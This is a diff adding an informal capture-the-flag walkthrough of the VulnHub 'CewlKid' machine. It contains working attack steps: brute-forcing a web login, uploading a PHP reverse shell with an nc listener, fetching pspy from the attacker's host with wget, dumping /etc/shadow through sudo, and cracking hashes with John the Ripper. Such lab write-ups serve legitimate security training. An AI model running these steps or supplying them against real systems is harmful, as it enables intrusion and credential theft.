@@ -1,0 +1,248 @@
+used nmap -sP 192.168.1.0/24 to scan the ip's in my network.
+
+used nmap to to scan the what ports are open. 10.10.10.3 OR 192.168.1.28
+is the CewlKid ip address. I set it to that
+before getting started with the VulnHub challange.
+After the nmap scan of nmap -sV -sC -T4 -p- 192.168.1.28
+i see the open ports. One open port is 8080. A website.
+
+In web browser input 192.168.1.28:8080
+
+user: admin
+pw: Letraset
+
+pw was gotten from using burpsuite to bruteforce. Must
+use a proxy to get use burpsuite.
+
+Once I'm in a message saying that the server is down will
+pop up. Go to the top right and you'll see that it is not
+true and you can still proceed as admin. 
+
+Once Im in the admin page I go and google to another website and get the
+php reverse shell at 
+https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+
+The php reverse shell was gotten to upload it in the files section of the domain.
+I edit the php file to have my VM local IP and I put the port 4444 bc thats the port that
+I'll be listening in when I input the following command in terminal when cd into cewlKidBox
+rlwrap nc -lnvp 4444
+So i could use my up error keys to get past commands and start to listen again.
+once that command is intiated it'll start listening for any traffic going through port 4444.
+So in the web browser I shall input http://192.168.1.28:8080/files/php-reverse-shell.php
+Once that loasds up the terminal should give me the info of that domain.
+This lets me into the OS that im trying to get into which is CewlKid.
+if i type ls I'll see all their directories. So now i gotta serach to see wassup.
+
+type export TERM=xterm
+this is so i could clear screen.
+
+Now I am going to look into a TTY shell.
+https://netsec.ws/?p=337
+There I am going to copy the following code. "I changed up a bit of the code"
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+Once I copy and paste the code in the terminal I should get into the www-data@cewlkid:/$
+I type id and see the id. Then I type whoami to see who this is.
+
+Now i should ls again to see where I am.
+I then see i could cd into home so I type 
+cd home
+ls
+I see these possible user when I ls in home
+cewlbeans  ipsum  kidcewl  lorem  zerocewl
+I then type cd and see example.com html
+so then i type cat example.com and get told that this is a directory so i cd in
+cd example.com
+I type ls and see that inside that directory is html. 
+type cd html
+ls
+ls -la
+that ls -la commmand is to see more in depth of what the files are. root files or not. read
+write... etc
+so I see two root files first I'll be looing into ...
+I type
+cd ...
+ls
+after I ls I see a file called nothing_to_see_here
+sudo -l
+pwd
+The pwd command is to print the working directory, starting from root.
+Then I type the following command
+sudo -u ipsum /usr/bin/cat /var/www/example.com/html/.../nothing_to_see_here
+-u ipsum will switch the user to ipsum and then the rest to where I am trying to get into.
+This command will generate a base64 code
+aXBzdW0gOiBTcGVha1Blb3BsZTIyIQo=
+bG9yZW0gOiBQZW9wbGVTcGVhazQ0IQo=
+
+I then open another window of terminal to decode these codes by typing
+echo aXBzdW0gOiBTcGVha1Blb3BsZTIyIQo= | base64 -d
+and I get
+ipsum : SpeakPeople22!
+
+for the other code I type
+echo bG9yZW0gOiBQZW9wbGVTcGVhazQ0IQo= | base64 -d
+and I get
+lorem : PeopleSpeak44!
+
+So these outputs seem to be usernames and passwords of people who have access to the root.
+
+Now I could switch the user to ipsum and input the password for it by the following command.
+su - ipsum
+after I get in I see that I am logged in as ipsum.
+I start to do some snooping around by type ls, id, whoami, sudo -l
+When i type sudo -l and input password I get a message saying
+Sorry, user ipsum may not run sudo on cewlkid.
+I pretty much cant do anything so I should try the other user and password that i got in the base64.
+So lets go back
+ls 
+cd ..
+ls
+cd ipsum
+su - lorem
+Here I switched into the other user.
+Before I switch though, I have to make sure that when Im ipsum i get in the directory of ipsum. Or else when im in lorem I wont be able to do it.
+This may or may not matter but its a precaution that Im taking since it was weird before.
+
+Now When i try to ls it will say Permission denied. So lets sudo -l
+I then get /usr/bin/base64 /etc/shadow maybe this can be cat or sudo so lets try these
+cat /usr/bin/base64 /etc/shadow
+Here I get some weird encrypted text so lets try sudo
+sudo /usr/bin/base64 /etc/shadow
+Here I get the following
+cm9vdDoqOjE4NDc0OjA6OTk5OTk6Nzo6OgpkYWVtb246KjoxODQ3NDowOjk5OTk5Ojc6OjoKYmlu
+Oio6MTg0NzQ6MDo5OTk5OTo3Ojo6CnN5czoqOjE4NDc0OjA6OTk5OTk6Nzo6OgpzeW5jOio6MTg0
+NzQ6MDo5OTk5OTo3Ojo6CmdhbWVzOio6MTg0NzQ6MDo5OTk5OTo3Ojo6Cm1hbjoqOjE4NDc0OjA6
+OTk5OTk6Nzo6OgpscDoqOjE4NDc0OjA6OTk5OTk6Nzo6OgptYWlsOio6MTg0NzQ6MDo5OTk5OTo3
+Ojo6Cm5ld3M6KjoxODQ3NDowOjk5OTk5Ojc6OjoKdXVjcDoqOjE4NDc0OjA6OTk5OTk6Nzo6Ogpw
+cm94eToqOjE4NDc0OjA6OTk5OTk6Nzo6Ogp3d3ctZGF0YToqOjE4NDc0OjA6OTk5OTk6Nzo6Ogpi
+YWNrdXA6KjoxODQ3NDowOjk5OTk5Ojc6OjoKbGlzdDoqOjE4NDc0OjA6OTk5OTk6Nzo6OgppcmM6
+KjoxODQ3NDowOjk5OTk5Ojc6OjoKZ25hdHM6KjoxODQ3NDowOjk5OTk5Ojc6OjoKbm9ib2R5Oio6
+MTg0NzQ6MDo5OTk5OTo3Ojo6CnN5c3RlbWQtbmV0d29yazoqOjE4NDc0OjA6OTk5OTk6Nzo6Ogpz
+eXN0ZW1kLXJlc29sdmU6KjoxODQ3NDowOjk5OTk5Ojc6OjoKc3lzdGVtZC10aW1lc3luYzoqOjE4
+NDc0OjA6OTk5OTk6Nzo6OgptZXNzYWdlYnVzOio6MTg0NzQ6MDo5OTk5OTo3Ojo6CnN5c2xvZzoq
+OjE4NDc0OjA6OTk5OTk6Nzo6OgpfYXB0Oio6MTg0NzQ6MDo5OTk5OTo3Ojo6CnRzczoqOjE4NDc0
+OjA6OTk5OTk6Nzo6Ogp1dWlkZDoqOjE4NDc0OjA6OTk5OTk6Nzo6Ogp0Y3BkdW1wOio6MTg0NzQ6
+MDo5OTk5OTo3Ojo6CmxhbmRzY2FwZToqOjE4NDc0OjA6OTk5OTk6Nzo6Ogpwb2xsaW5hdGU6Kjox
+ODQ3NDowOjk5OTk5Ojc6OjoKc3NoZDoqOjE4NTEyOjA6OTk5OTk6Nzo6OgpzeXN0ZW1kLWNvcmVk
+dW1wOiEhOjE4NTEyOjo6Ojo6CmtpZGNld2w6JDYkOTloZ09VcVhPUXh6ZHQ4byQxc0FMUmhUaGs5
+Mlo4emdpT2xuWlozbjNqVVc2Ny5rVXRWVnhLSGFMbktBc3Bybm1veVZjazh2WHNOTFY5QlQ0OU9J
+TWtJQU1CNVhrN2pNaE5LL25uMToxODUxMjowOjk5OTk5Ojc6OjoKbHhkOiE6MTg1MTI6Ojo6OjoK
+aXBzdW06JDYkeUZreE9SYkkuUHI3aE5BViRGUTVCSFdqb2lIUEVDUnpqRnc5MC9mbHZ1NzFpbkJU
+djVGZlhUOXI3eTZ2VlNVL2lmTU5WWkoxdDFrNDNhcXl3Yi5CalNyOW5YeDJ1S0s3YkZ2OHRFLjox
+ODUxNDowOjk5OTk5Ojc6OjoKbG9yZW06JDYkUzhsWlF5eEJrTjM0a3NiUiRnYXBsN09nbm1DeTBn
+RzBvRzJjOTJnL0pHbGgvMHZnRVFneGh6UlR6NDZGZWpkN0lFTkZsUEdrZ1BVa1hLcVVPaUlsM1Zj
+LjdGVGRtZ3FOQVB3R0ZnLjoxODUxNDowOjk5OTk5Ojc6OjoKemVyb2Nld2w6JDYkVmRENWpPbkVN
+VWdqaUxXaiRnSzMxNXZMejgyTjJCUEtKQjJ0bFdRZkdIaWxnbW1qcVVReDZHWERHU1ZkWFMuV0Z1
+cml0ZEIzaGFNa0RQeVROUFRyNFB2OGpJTjU0SmswakhpZUxmLjoxODUxNDowOjk5OTk5Ojc6OjoK
+Y2V3bGJlYW5zOiQ2JDVmRndRazRhM1U3dE93Tmskdkdnd3YybVBmc3FGckpHV3NHeDJ2Ulo2OU5X
+MmhiQnQ1YVh6RGtHRm5Nd1hrMnFBZUtXQlpqWTJudTllTnJMVnY5VnRpSEQ3elV5QS91RVFMbUpG
+ejE6MTg1MTQ6MDo5OTk5OTo3Ojo6Cg==
+
+This will need to get decrypted as base64.
+So I'll create a file called shadow to decrypt this message.
+touch shadow.base64
+nano shadow.base64
+copy and paste base64 code
+Then type the following to decrypt
+base64 -d shadow.base64
+after I will get some files that I could crack into. Im going to get into the zerocewl.
+
+So I am going to use hashcat or john the ripper to crack the password thats encrypted.
+first I make a hash file
+touch hash.txt
+echo "$6$VdD5jOnEMUgjiLWj$gK315vLz82N2BPKJB2tlWQfGHilgmmjqUQx6GXDGSVdXS.WFuritdB3haMkDPyTNPTr4Pv8jIN54Jk0jHieLf." > hash.txt
+nano hash.txt
+I nano in side the txt file to change the code bc it wasnt written right.
+cat hash.txt
+to see that the code was written right inside the hash.txt file.
+
+begin the cracking with john the ripper using the following command.. may need to use other wordlists for this.
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+john --show hash.txt
+
+U: zerocewl
+pw: PageMaker
+
+Now i go back and switch users to zerocewl.
+su - zerocewl
+ls
+and i see hosts is highlighted.
+Lets see what I can do with that.
+cant cd hosts
+so cat hosts
+shows me ip's
+
+Now I cd my way all the way back
+and cd into dev
+cd dev
+
+then I input ls -la
+Here I see that "shm" lets me execute so I'll be looking into that.
+cd shm
+Look into /dev/shm/
+
+I am going to download and use a tool called pspy
+
+first I need to set up a python server that'll be listening on port 4444 This will be on the terminal thats cd into my cewlkidbox directory from the Desktop
+python -m http.server 4444
+
+then this will get inputted to install the pspy64 tool into the zerocewl /dev/shm directory
+wget http://192.168.1.27:4444/pspy64
+
+When I ls i should see multipath and pspy64
+
+now i could try to get into the pspy64 file by inputting
+./pspy64 
+but i'll get permission denied bc I cant write or read it or execute it so i input
+chmod +x pspy64
+and now i could execute the file with ./pspy64
+
+Here in the pspy64 file i am going to be looking for passwords in the processes list. 
+
+I should see something like this
+/root/pth-toolkit-master/bin/winexe -U cewlbeans%fondateurs //kali whoami 
+
+so I get the user name and password seperated by a % sign (This maybe is the pw for cewlbeans)
+
+U: cewlbeans
+pw: fondateurs
+
+Now I am going to go back and switch users into cewlbeans.. do same process as way back before if needed.
+I may need to go back to listening and reload my http://192.168.1.28:8080/files/php-reverse-shell.php. Just follow the old steps from before.
+
+Once im in i cd into home
+and switch users
+
+su - cewlbeans
+
+When Im in cewlbean I do the regular of snooping around.
+id, ls, 
+
+when in cewlbeans if i ls I will get nothing.
+So what you do is cd into nothing
+cd /
+
+now when you ls you'll get a list
+here I see a root directory.. lets try to get in
+sudo su
+
+after I'll be asked for password of cewlbeans.. once I input it, I'll be switch user to root
+
+now I cd into root
+cd root
+
+When in I'll ls and see the following
+pth-toolkit-master  root.txt  snap
+
+Hmmmm... what is root.txt
+to open I input
+cat root.txt
+
+HERE I GET THE FLAG OF THE CEWL KID BOX! IM DONE
+RmxhZwo=  
+
+
+--------------------------------------------------------------------------------------
+https://github.com/DominicBreuker/pspy
+
+https://netsec.ws/?p=337
